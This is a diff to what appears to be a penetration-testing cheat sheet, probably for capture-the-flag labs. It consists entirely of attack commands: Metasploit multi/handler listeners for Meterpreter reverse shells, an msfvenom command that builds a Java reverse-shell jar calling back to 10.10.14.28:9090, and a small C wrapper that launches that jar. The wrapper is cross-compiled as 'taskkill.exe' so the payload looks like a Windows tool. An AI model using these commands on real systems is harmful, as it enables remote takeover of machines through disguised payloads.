@@ -3,3 +3,18 @@
 ==============================================================================
 msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.178.16; set lport 443; set ExitOnSession false; exploit -j"
 msfconsole -x "use multi/handler;set payload windows/meterpreter/reverse_tcp; set lhost 192.168.178.16; set lport 443; set ExitOnSession false; exploit -j"
+
+==============================================================================
+[+] Create Payload 
+==============================================================================
+
+msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.28 LPORT=9090 -f jar -o rev.jar
+vim taskkill.c  
+
+#include <stdlib.h>
+
+int main() {
+  system("java -jar rev.jar");
+}
+
+x86_64-w64-mingw32-gcc -o taskkill.exe taskkill.c
